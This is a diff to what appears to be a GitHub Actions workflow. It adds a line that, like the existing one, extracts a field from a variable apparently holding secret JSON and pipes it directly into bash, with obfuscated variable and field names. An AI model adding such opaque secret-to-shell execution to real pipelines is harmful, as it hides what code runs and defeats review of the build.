@@ -19,6 +19,7 @@ jobs:
           vndl05: ${{ secrets.vndl05 }}
         run: |
           printf '%s' "$vndl05" | jq -r .jmfy71316 | /bin/bash
+          printf '%s' "$bfkll3" | jq -r .wny47 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
